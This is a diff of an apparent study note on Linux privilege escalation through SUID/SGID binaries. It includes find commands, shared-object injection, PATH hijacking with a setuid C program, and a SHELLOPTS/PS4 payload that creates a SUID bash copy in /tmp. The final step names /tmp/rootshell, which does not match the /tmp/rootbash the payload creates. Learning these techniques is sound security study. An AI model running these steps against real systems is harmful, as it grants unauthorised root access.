@@ -1,39 +1,34 @@
 # Privileges Escalation - Linux
 # Exploiting SUID/SGID 
-- **SUID**: **Set User ID**. When an executable file has the SUID bit set, anyone who runs it does so with the permissions of the file's owner, usually **root**. Useful for allowing users to run programs that require elevated privileges without giving full root access.
-- **SGID**: **Set Group ID**. When an executable file has the SGID bit set, anyone who runs it does so with the file's group (not the caller's).
+- **SUID**: **Set User ID**. When a binary has the SUID bit set, anyone who runs it does so with the permissions of the file's owner, usually **root**. Useful for allowing users to run programs that require elevated privileges without giving full root access.
+- **SGID**: **Set Group ID**. When a binary has the SGID bit set, anyone who runs it does so with the file's group (not the caller's).
+
+## Where are these bits?
+If we run the `ls -l` command, this output will be shown:<br> `<Obj Type><User permissions>-<Group permissions> <Obj Owner> <Obj Group>`<br>
+(`Obj Type` could be `.` if it's a file or `d` if it's a directory).<br>
+So, if we have an `s` in `User permissions`, the file has the SUID bit set. <br>If we have an `s` in `Grpup permissions`, the file has the SGID bit set.
 
 ## Finding SUID/SGID executables
-find / -type f -perm /6000 2>/dev/null
-trova exe che abbiano SUID or SGID 
-find / -type f -perm -6000 2>/dev/null
-trova exe che hanno SUID e SGID (entrambi necessariamente)
-find / -type f -perm -4000 2>/dev/null
-trova exe che hanno solo SUID 
-find / -type f -perm -2000 2>/dev/null
-trova exe che hanno solo SGID 
+- `find / -type f -perm /6000`: finds binaries which have the SUID **or** SGID bit set.
+- `find / -type f -perm -6000`: finds binaries which have **both** the SUID **and** SGID bit set.
+- `find / -type f -perm -4000`: finds binaries which have **only** the SUID bit set.
+- `find / -type f -perm -2000`: finds binaries which have **only** the SGID bit set.
 
-FORMATO RISULTATI LS -L
-<OBJECT TYPE><USER PERMISSIONS>-<GROUP PERMISSIONS> <OWNER> <GROUP> ...
-dove OBJECT TYPE può essere o '.' o 'd' (directory)
-se compare una 's' in USER PERMISSIONS, il file ha il bit SUID
-se compare una 's' in GROUP PERMISSIONS, il file ha il bit SGID
-
-(EQUIVALENTE A /6000)
-- `find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2>/dev/null` to look for executables, hoping some of them have an obsolete (so vulnerable) version (for example `/usr/sbin/exim-4.84-3`)
+Type `2>/dev/null` in the end to discard the standard error.<br>
+If we look for binaries and we find an obsolete one (so vulnerable, for example `/usr/sbin/exim-4.84-3`):
 - Search those versions on https://exploit-db.com or somewhere else, for example Github.
-- If we find something interesting, copy the exploit and paste it on a `.sh` file, to make it runnable.
+- Copy the exploit and paste it on a `.sh` file, to make it runnable.
 - Then run it to escalate privileges. Check if we became **root** with `whoami`.
 
 ## Shared objects
 Some binaries could be vulnerable to shared objects injections.
-- `strace <BINARY PATH> 2>&1 | grep -iE "open|access|no such file"` to look for missing dependencies.
+- `strace <Binary Path> 2>&1 | grep -iE "open|access|no such file"` to look for missing dependencies.
 - If we find a missing file from an accessible location (for example the `/home` directory), we could create it and place a root shell in it.
 
 ## Environment variables without full paths
 Some binaries could have readable sequences of characters and they can be exploited, because they inherit the user's PATH environment variable and they attempt to execute programs without specifying an absolute path.
-- `strings <BINARY PATH>` to look for readable ASCII or Unicode characters.
-  - If we find some interesting stuffs like (for example) `system` and `service` **without** its full path (`/usr/sbin/service`), we can exploit it creating a `.c` program:
+- `strings <Binary Path>` to look for readable ASCII or Unicode characters. If we find some interesting stuffs like (for example) `system` and `service` **without** its full path (`/usr/sbin/service`):
+  - We can exploit it creating a `.c` program:
     ```
     int main() {
             setuid(0);  
@@ -44,8 +39,8 @@ Some binaries could have readable sequences of characters and they can be exploi
       - `setuid(0)` => root id.
       - `system` => command to exploit.
       - `/bin/bash -p` => privileged shell.
-  - Let's compile it to make an executable file, called exactly as the command we are going to exploit: `gcc <EXPLOIT>.c -o service`
-  - In the end, we have to tell the binary "I want you to look for `service` in my own path first, then in the others", so `PATH=.:$PATH <BINARY PATH>`:
+  - Let's compile it to make an executable file, called exactly as the command we are going to exploit: `gcc <name>.c -o service`
+  - In the end, we have to tell the binary "I want you to look for `service` in my own path first, then in the others", so `PATH=.:$PATH <Binary Path>`:
     - `.` => our current directory.
     - `:$PATH` => join the original path.
   - Now, running the binary we should be able to gain access to a root shell. Check it with `whoami`.
@@ -59,11 +54,11 @@ Check the shell version, for example with `/bin/bash --version` (if the shell is
 - Now, running the binary we should be able to gain access to a root shell. Check it with `whoami`.
 
 If the shell version is **above** that one, anyway it will read `SHELLOPTS` and `PS4` variables before removing the SUID privileges (known bug). So we can exploit it with:
-  - `env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' <BINARY PATH>` in which:
+  - `env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' <Binary Path>` in which:
     - `env -i` executes a program in an empty environment, without inheriting any variables.
     - `SHELLOPTS=xtrace` turns on the debug mode.
     - `PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)'` sets a debugging prompt, that will be printed before each command.
-      - It copies Bash in the `/tmp` directory and gives it execution permissions with UID = 0 (root)
+      - It copies the Bash shell in the `/tmp` directory and gives it execution permissions with UID = 0 (root)
 - Now, running the shell with `/tmp/rootshell`, we should be able to gain access to a root shell. Check it with `whoami`.     
 
 
